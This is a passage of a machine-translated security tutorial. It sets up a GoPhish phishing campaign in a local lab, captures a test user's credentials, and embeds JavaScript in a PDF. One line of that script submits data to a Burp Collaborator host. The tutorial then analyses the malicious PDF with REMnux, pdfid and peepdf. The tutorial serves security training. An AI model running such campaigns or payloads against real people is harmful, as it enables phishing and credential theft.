iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated"><strong class="jw ir"> 4。用户&amp;组</strong></p><p id="ced8" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我们添加用户，基本上，我们可以从网络钓鱼者的角度说受害者。还有一个批量导入用户的选项。</p><figure class="lg lh li lj gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi oy"><img src="../Images/474c4b11e5be8154762660fe4ed67418.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*D8qfYofDSs3Aydrp_kpuAQ.png"/></div></div></figure><p id="81f9" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我们添加了一个示例用户<strong class="jw ir"> john wick。</strong>我们可以修改和删除群组。</p><p id="4a34" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated"><strong class="jw ir">保存它。</strong></p><figure class="lg lh li lj gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi oz"><img src="../Images/880b6e02a0c30768e815624cd0e43de9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*mth2ahc-X93FdNUAlx60Eg.png"/></div></div></figure><p id="ebad" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated"><strong class="jw ir"> 5。活动</strong></p><p id="da40" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">这是最有趣的部分。从这里我们发动攻击，监控电子邮件活动，如打开电子邮件，点击链接等。</p><p id="de5f" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">创建一个新的活动，其中我们有一个电子邮件模板，登录页面，以及我们先前创建的相关组。</p><p id="fad0" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">请记住，URL应该是一个gophish侦听器，并且应该可以被目标用户访问。“172.18.0.2”是我的gophish服务器运行的IP地址。当我运行docker时，情况就像以前一样。只要确保URL应该是gophish侦听器即可。</p><figure class="lg lh li lj gt jr gh gi paragraph-image"><div class="gh gi pa"><img src="../Images/8c2535ce5733078a455cf43375d831fb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1058/format:webp/1*SLgyZdsl1b1bHNHrRLVd9A.png"/></div></figure><p id="811c" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">将IP反映到正文中会使其非常可疑，并且将IP地址直接放入电子邮件正文中不是一个好习惯。我已经在我的主机文件中添加了一个主机名。这将把我的gophish <strong class="jw ir"> IP地址</strong>解析成<strong class="jw ir">“testing server . op”。</strong></p><p id="050d" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">如果你记得我们把<a class="ae ni" href="https://mail.google.com/mail/u/1/%7B%7B.URL%7D%7D" rel="noopener ugc nofollow" target="_blank"> {{。网址}} </a>"在我们的电子邮件模板中。实际上，我们在这里放了一个gopher监听器URL。</p><figure class="lg lh li lj gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi pb"><img src="../Images/eb6eb2e1f41080a3da2bfb3483d3683b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*BdnopFiSVwhSHuULuy71fA.png"/></div></div></figure><p id="1214" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">是时候发射了。</p><figure class="lg lh li lj gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi pc"><img src="../Images/9fa055a9834c6a4f980a5a1232839bde.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*fo-EYdK_V3Dq95wkhCalPA.png"/></div></div></figure><p id="ac2b" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">仪表板提供了清晰的视野。该状态表示电子邮件发送成功。</p><p id="a2be" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">让我们进入我们的mailhog GUI。我们的收件箱里有一封电子邮件。</p><figure class="lg lh li lj gt jr gh gi paragraph-image"><div class="gh gi pd"><img src="../Images/4644e8a21caf4b3e91d1f5d092997547.png" data-original-src="https://miro.medium.com/v2/resize:fit:434/format:webp/1*JVWDTHma7XeRXaH2v5EyzQ.png"/></div></figure><p id="e0eb" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我们已经收到一封电子邮件。</p><figure class="lg lh li lj gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi pe"><img src="../Images/ef5949a828e33db5fce74c9251ae918b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*j9wo4D_I4YaGN238fltOgg.png"/></div></div></figure><figure class="lg lh li lj gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi pf"><img src="../Images/c19b112fc65e8030c14ca143760bac73.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*KxkPSFO7bLWn2d6HWZLPEA.png"/></div></div></figure><p id="4ff6" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我们可以在MIME部分找到我们的附件pdf。</p><figure class="lg lh li lj gt jr gh gi paragraph-image"><div class="gh gi pg"><img src="../Images/fa5b9a6e0441db17158ef003809eef84.png" data-original-src="https://miro.medium.com/v2/resize:fit:1252/format:webp/1*EWtibj548s4fa7aGpUY19Q.png"/></div></figure><p id="c4ab" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">下载附件中的pdf文件。</p><p id="98d2" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">注意链接并打开它。是的，会显示登录页面。</p><figure class="lg lh li lj gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi ph"><img src="../Images/e84fe3f8fefaa467bd1dbb66fdc1563b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*9SXTlYG_jdmhr6KD7IWlow.png"/></div></div></figure><p id="6faf" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">填写表格并点击提交按钮。</p><figure class="lg lh li lj gt jr gh gi paragraph-image"><div class="gh gi pi"><img src="../Images/81de6c40c3bc1bb3d0ad0bed9dd28436.png" data-original-src="https://miro.medium.com/v2/resize:fit:742/format:webp/1*g6P3W0tY6GRYETBPhrLQHA.png"/></div></figure><p id="a9c3" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我们将被重定向到指定的页面。</p><figure class="lg lh li lj gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi pj"><img src="../Images/46b76cfd57d612d2465d3d5cf808bf9b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*og6vAEGFt2QFlCijaPIBeg.png"/></div></div></figure><p id="2b12" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">只要看看仪表板。我们发现:</p><ol class=""><li id="a417" class="ks kt iq jw b jx jy kb kc kf ku kj kv kn kw kr kx ky kz la bi translated">链接被点击了多少次</li><li id="a036" class="ks kt iq jw b jx lb kb lc kf ld kj le kn lf kr kx ky kz la bi translated">数据提交了多少次</li><li id="25ac" class="ks kt iq jw b jx lb kb lc kf ld kj le kn lf kr kx ky kz la bi translated">电子邮件的链接被打开了多少次</li></ol><figure class="lg lh li lj gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi pk"><img src="../Images/45e48c10a99e805da87fe09e16d0e83a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*NZShK2l6sn3IY2-zJ2hTbw.png"/></div></div></figure><p id="0632" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">点击按钮，即查看结果。</p><figure class="lg lh li lj gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi pl"><img src="../Images/a1ec6f0cb2f87762fcf44c5de8488aca.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*lON0yB5RKu0k2xG4qq0KzQ.png"/></div></div></figure><figure class="lg lh li lj gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi pm"><img src="../Images/d613926b67711bead33126c7156b540c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*XFMV4bjU7yQzjhz-CkGMtw.png"/></div></div></figure><p id="b040" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">是的，我们成功获取了用户名和密码。</p><p id="9ee2" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">是时候打开我们之前下载的pdf文件了。</p><p id="a7d5" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">它执行我们插入的js代码。查看有效负载产生的爆音。</p><pre class="lg lh li lj gt lk ll lm ln aw lo bi"><span id="2e2b" class="lp lq iq ll b gy lr ls l lt lu">app.alert("alter alert");</span></pre><figure class="lg lh li lj gt jr gh gi paragraph-image"><div class="gh gi pn"><img src="../Images/48a8819267066c54c448e8dae2b35eda.png" data-original-src="https://miro.medium.com/v2/resize:fit:1076/format:webp/0*8MXnSK1nEcS3IyhW.png"/></div></figure><p id="da1b" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">当然，你可以做的不止这些。我建议对这个主题进行更多的探索。</p><pre class="lg lh li lj gt lk ll lm ln aw lo bi"><span id="7fef" class="lp lq iq ll b gy lr ls l lt lu">this.submitForm('http://azdn342b12dbmo0uvmj5yrekrbx1lq.burpcollaborator.net');</span></pre><p id="9c0a" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我们每次都必须点击“允许”,这使得整个过程非常繁琐。</p><p id="8e14" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">(仅适用于上述有效载荷)</p><figure class="lg lh li lj gt jr gh gi paragraph-image"><div class="gh gi po"><img src="../Images/1d5361b3832f1e338eda43df98a7aa84.png" data-original-src="https://miro.medium.com/v2/resize:fit:1262/format:webp/0*OLiyPH2n_DjZ7GQP.png"/></div></figure><p id="b22d" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我在我的burp collab服务器上获得了DNS和HTTP请求。</p><figure class="lg lh li lj gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi pp"><img src="../Images/03ad06610dcafccff9a6a1cb4a49cbb2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*9i1wRVqcB4lblF6d.png"/></div></div></figure><p id="d8e3" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">这都是关于如何发起网络钓鱼运动。</p><h1 id="3c8f" class="lv lq iq bd lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn mo mp mq mr bi translated">分析</h1><p id="da18" class="pw-post-body-paragraph ju jv iq jw b jx ms jz ka kb mt kd ke kf mu kh ki kj mv kl km kn mw kp kq kr ij bi translated">从这一点出发，我们将分析所有这些活动。</p><p id="350e" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">分析部分应该总是在沙盒环境中完成。走出沙盒环境就像容易死亡。无红利(ex-dividend)</p><p id="8144" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">你的第一步应该是在电子邮件中寻找任何奇怪的东西。</p><ol class=""><li id="0ac6" class="ks kt iq jw b jx jy kb kc kf ku kj kv kn kw kr kx ky kz la bi translated">分析来源</li><li id="f5b5" class="ks kt iq jw b jx lb kb lc kf ld kj le kn lf kr kx ky kz la bi translated">尝试找到电子邮件的来源，如发件人IP</li></ol><p id="c042" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">要查找分析电子邮件标题的站点</p><div class="pq pr gp gr ps pt"><a href="https://toolbox.googleapps.com/apps/messageheader/analyzeheader" rel="noopener  ugc nofollow" target="_blank"><div class="pu ab fo"><div class="pv ab pw cl cj px"><h2 class="bd ir gy z fp py fr fs pz fu fw ip bi translated">邮件头</h2><div class="qa l"><h3 class="bd b gy z fp py fr fs pz fu fw dk translated">编辑描述</h3></div><div class="qb l"><p class="bd b dl z fp py fr fs pz fu fw dk translated">toolbox.googleapps.com</p></div></div></div></a></div><div class="pq pr gp gr ps pt"><a href="https://mha.azurewebsites.net/" rel="noopener  ugc nofollow" target="_blank"><div class="pu ab fo"><div class="pv ab pw cl cj px"><h2 class="bd ir gy z fp py fr fs pz fu fw ip bi translated">消息头分析器</h2><div class="qa l"><h3 class="bd b gy z fp py fr fs pz fu fw dk translated">编辑描述</h3></div><div class="qb l"><p class="bd b dl z fp py fr fs pz fu fw dk translated">mha.azurewebsites.net</p></div></div></div></a></div><p id="3c95" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">3.提取URL和取消URL的绑定</p><div class="pq pr gp gr ps pt"><a href="https://gchq.github.io/CyberChef/#recipe=Extract_URLs%28false%29Defang_URL%28true,true,true,%27Valid%20domains%20and%20full%20URLs%27%29&amp;input=aHR0cDovL2dvb2dsZS5jb20" rel="noopener  ugc nofollow" target="_blank"><div class="pu ab fo"><div class="pv ab pw cl cj px"><h2 class="bd ir gy z fp py fr fs pz fu fw ip bi translated">网络咖啡馆</h2><div class="qa l"><h3 class="bd b gy z fp py fr fs pz fu fw dk translated">网络瑞士军刀-一个用于加密、编码、压缩和数据分析的网络应用程序</h3></div><div class="qb l"><p class="bd b dl z fp py fr fs pz fu fw dk translated">gchq.github.io</p></div></div><div class="qc l"><div class="qd l qe qf qg qc qh js pt"/></div></div></a></div><p id="d042" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">4.检查可疑URL或IP地址的DNS记录</p><p id="ea83" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">5.对可疑的网址或IP地址进行截图</p><div class="pq pr gp gr ps pt"><a href="https://www.url2png.com/" rel="noopener  ugc nofollow" target="_blank"><div class="pu ab fo"><div class="pv ab pw cl cj px"><h2 class="bd ir gy z fp py fr fs pz fu fw ip bi translated">截图即服务</h2><div class="qa l"><h3 class="bd b gy z fp py fr fs pz fu fw dk translated">在您的应用中快速可靠地捕捉任何网站的快照。</h3></div><div class="qb l"><p class="bd b dl z fp py fr fs pz fu fw dk translated">www.url2png.com</p></div></div><div class="qc l"><div class="qi l qe qf qg qc qh js pt"/></div></div></a></div><p id="3828" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">6.检查URL或IP是否被列入黑名单</p><div class="pq pr gp gr ps pt"><a href="https://www.ipvoid.com/ip-blacklist-check/" rel="noopener  ugc nofollow" target="_blank"><div class="pu ab fo"><div class="pv ab pw cl cj px"><h2 class="bd ir gy z fp py fr fs pz fu fw ip bi translated">IP地址黑名单检查，IP DNSBL检查| IPVoid</h2><div class="qa l"><h3 class="bd b gy z fp py fr fs pz fu fw dk translated">扫描一个IP地址通过多个基于DNS的黑名单(DNSBL)和IP信誉服务，以促进…</h3></div><div class="qb l"><p class="bd b dl z fp py fr fs pz fu fw dk translated">www.ipvoid.com</p></div></div><div class="qc l"><div class="qj l qe qf qg qc qh js pt"/></div></div></a></div><p id="939d" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">7.检查URL或Ip地址是否是恶意的</p><div class="pq pr gp gr ps pt"><a href="https://www.virustotal.com/gui/home/upload" rel="noopener  ugc nofollow" target="_blank"><div class="pu ab fo"><div class="pv ab pw cl cj px"><h2 class="bd ir gy z fp py fr fs pz fu fw ip bi translated">病毒总数</h2><div class="qa l"><h3 class="bd b gy z fp py fr fs pz fu fw dk translated">病毒总数</h3></div><div class="qb l"><p class="bd b dl z fp py fr fs pz fu fw dk translated">VirusTotalwww.virustotal.com</p></div></div></div></a></div><p id="1468" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">8.下载附件，得到它的散列，然后分析它们是否是恶意的</p><div class="pq pr gp gr ps pt"><a href="https://www.virustotal.com/gui/home/upload" rel="noopener  ugc nofollow" target="_blank"><div class="pu ab fo"><div class="pv ab pw cl cj px"><h2 class="bd ir gy z fp py fr fs pz fu fw ip bi translated">病毒总数</h2><div class="qa l"><h3 class="bd b gy z fp py fr fs pz fu fw dk translated">病毒总数</h3></div><div class="qb l"><p class="bd b dl z fp py fr fs pz fu fw dk translated">VirusTotalwww.virustotal.com</p></div></div></div></a></div><div class="pq pr gp gr ps pt"><a href="https://talosintelligence.com/talos_file_reputation" rel="noopener  ugc nofollow" target="_blank"><div class="pu ab fo"><div class="pv ab pw cl cj px"><h2 class="bd ir gy z fp py fr fs pz fu fw ip bi translated">Talos文件信誉</h2><div class="qa l"><h3 class="bd b gy z fp py fr fs pz fu fw dk translated">输入文件的SHA256以搜索Talos的当前文件信誉系统。处置搜索将返回文件的…</h3></div><div class="qb l"><p class="bd b dl z fp py fr fs pz fu fw dk translated">talosintelligence.com</p></div></div></div></a></div><p id="0ee4" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">9.最后，我们深入分析，我们使用不同的恶意软件分析工具。应遵循自动和手动方法。</p><p id="f8bd" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">当然，还不止这些，但是根据我们这个博客的上下文，我们将分析附件中的pdf。</p><p id="c8e9" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我将使用remnux发行版来分析pdf文件。</p><p id="35eb" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">"<strong class="jw ir"> REMnux </strong>是一个用于逆向工程和分析恶意软件的Linux工具包。REMnux提供了一个由社区创建的免费工具的精选集合。分析师可以使用它来调查恶意软件，而不必查找、安装和配置这些工具。”</p><p id="2492" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我已经提取了图像。</p><pre class="lg lh li lj gt lk ll lm ln aw lo bi"><span id="b781" class="lp lq iq ll b gy lr ls l lt lu"><strong class="ll ir">docker</strong> pull remnux/remnux-distro</span><span id="c5a8" class="lp lq iq ll b gy ol ls l lt lu"><strong class="ll ir">docker</strong> run --rm -itd remnux/remnux-distro /bin/bash</span><span id="ac4b" class="lp lq iq ll b gy ol ls l lt lu"><strong class="ll ir">docker</strong> cp downloadme.pdf '&lt;contid&gt;:/tmp'</span><span id="51a2" class="lp lq iq ll b gy ol ls l lt lu"><strong class="ll ir">docker</strong> exec -it d3511ccab833 /bin/bash</span></pre><p id="be07" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我们现在进入集装箱。</p><figure class="lg lh li lj gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi qk"><img src="../Images/aee92ad60b9ebd589d2c6ff3edf4af17.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*qKwyuHTyOYxzRUuYexOW8g.png"/></div></div></figure><figure class="lg lh li lj gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi of"><img src="../Images/0bbbeb63d3e2c1fa0f16351907d9c3af.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*9rVBtInppd4nJvM_EYayJQ.png"/></div></div></figure><p id="5f39" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">首先，检查pdf是否有正确的幻数。</p><figure class="lg lh li lj gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi ql"><img src="../Images/9d71424b31a98e6d1cf01247d8e28c44.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*EIUyDBP5XlYse1FxsMNZ3Q.png"/></div></div></figure><p id="4b83" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">要查看它，请访问这里:【https://en.wikipedia.org/wiki/List_of_file_signatures T2】</p><p id="1d9b" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">似乎是正确的。</p><p id="2465" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">让我们用一个叫做<strong class="jw ir"> pdfid </strong>的工具来分析这个pdf文件。</p><figure class="lg lh li lj gt jr gh gi paragraph-image"><div class="gh gi qm"><img src="../Images/5c39735ba7e6f942aab1b6dfbddfa091.png" data-original-src="https://miro.medium.com/v2/resize:fit:942/format:webp/1*-D-e5H68ONNb6t1yVZnKcQ.png"/></div></figure><p id="6daa" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">它包含一些javascript。我们最好不要打开pdf文件，因为/OpenAction也是1，这意味着js将在打开pdf文件时采取一些行动。</p><p id="c6ab" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">你还能在下面找到什么标题？</p><pre class="lg lh li lj gt lk ll lm ln aw lo bi"><span id="a66d" class="lp lq iq ll b gy lr ls l lt lu">The first 7 words or less to it , you can find them in almost every pdf.</span><span id="55d1" class="lp lq iq ll b gy ol ls l lt lu">/Page - the number of pages in pdf</span><span id="8b64" class="lp lq iq ll b gy ol ls l lt lu">/Encrypt - stipulates a password need to be read</span><span id="acc2" class="lp lq iq ll b gy ol ls l lt lu">/ObjStm - object streams</span><span id="2512" class="lp lq iq ll b gy ol ls l lt lu">/Js - pdf file may contains js code which could be malicious to open</span><span id="2215" class="lp lq iq ll b gy ol ls l lt lu">/AA  and /OpenAction - action that will carried out automatically when we open a pdf file. Could automatically launch malicious js commands</span><span id="b794" class="lp lq iq ll b gy ol ls l lt lu">/AcroForm - pdf form authored with Adobe Acrobat Pro/Standard</span><span id="9918" class="lp lq iq ll b gy ol ls l lt lu">/JBIG2Decode - indicates pdf uses JBIG2Decode compression</span><span id="ad72" class="lp lq iq ll b gy ol ls l lt lu">/RichMedia - use to embed files,videos etc on pdf</span><span id="9f8e" class="lp lq iq ll b gy ol ls l lt lu">/Launch - to lauch some actions</span><span id="86fc" class="lp lq iq ll b gy ol ls l lt lu">/EmbeddedFile -   contains some external files</span><span id="70a4" class="lp lq iq ll b gy ol ls l lt lu">/XFA - XML Forms Architecture</span><span id="237a" class="lp lq iq ll b gy ol ls l lt lu">/URI -  Url to access</span></pre><p id="e81c" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我发现<strong class="jw ir"> peedpdf </strong>比<strong class="jw ir"> pdfid </strong>更酷，因为<strong class="jw ir"> peepdf </strong>可以提供相同的信息。已经发现pdf包含一些<strong class="jw ir">可疑元素</strong>即JS</p><pre class="lg lh li lj gt lk ll lm ln aw lo bi"><span id="0624" class="lp lq iq ll b gy lr ls l lt lu">pdfid lastone.pdf<br/>peepdf lastone.pdf</span></pre><figure class="lg lh li lj gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi qn"><img src="../Images/95483f4a8d412debcb0b318c89fb03f2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*iORTJYY_H4aq3e49qNqhQA.png"/></div></div></figure><p id="6595" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我们可以使用这些工具提取js内容。为此，我们必须编写一个简单的脚本。即<strong class="jw ir">提取js &gt; aything.txt </strong></p><p id="5388" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">将它保存在一个文件中。</p><p id="2ed8" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">echo ' extract js &gt; extracted . txt ' &gt; any thing . txt</p><p id="6de1" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">现在提取js内容。</p><p id="0103" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">peep df-s extract . txt malicouspdf.pdf</p><pre class="lg lh li lj gt lk ll lm ln aw lo bi"><span id="c210" class="lp lq iq ll b gy lr ls l lt lu">echo ‘extract js &gt; extracted.txt’ &gt; anything.txt<br/>peepdf -s extract.txt malicouspdf.pdf</span></pre><figure class="lg lh li lj gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi qo"><img src="../Images/036a20a7f99adebcbdf3f01f746b67a4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*0ivYMN4W_e8q3ZECPSu4Cg.png"/></div></div></figure><p id="681a" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">js内容被成功提取。</p><p id="19d3" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">感谢您的阅读。:)</p><p id="c796" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">祝你白天/晚上愉快。</p></div><div class="ab cl qp qq hu qr" role="separator"><span class="qs bw bk qt qu qv"/><span class="qs bw bk qt qu qv"/><span class="qs bw bk qt qu"/></div><div class="ij ik il im in"><h1 id="c5fb" class="lv lq iq bd lw lx qw lz ma mb qx md me mf qy mh mi mj qz ml mm mn ra mp mq mr bi translated">🔈 🔈Infosec Writeups正在组织其首次虚拟会议和网络活动。如果你对信息安全感兴趣，这是最酷的地方，有16个令人难以置信的演讲者和10多个小时充满力量的讨论会议。<a class="ae ni" href="https://iwcon.live/" rel="noopener ugc nofollow" target="_blank">查看更多详情并在此注册。</a></h1><div class="pq pr gp gr ps pt"><a href="https://iwcon.live/" rel="noopener  ugc nofollow" target="_blank"><div class="pu ab fo"><div class="pv ab pw cl cj px"><h2 class="bd ir gy z fp py fr fs pz fu fw ip bi translated">IWCon2022 - Infosec书面报告虚拟会议</h2><div class="qa l"><h3 class="bd b gy z fp py fr fs pz fu fw dk translated">与世界上最优秀的信息安全专家建立联系。了解网络安全专家如何取得成功。将新技能添加到您的…</h3></div><div class="qb l"><p class="bd b dl z fp py fr fs pz fu fw dk translated">iwcon.live</p></div></div><div class="qc l"><div class="rb l qe qf qg qc qh js pt"/></div></div></a></div></div></div>    
</body>
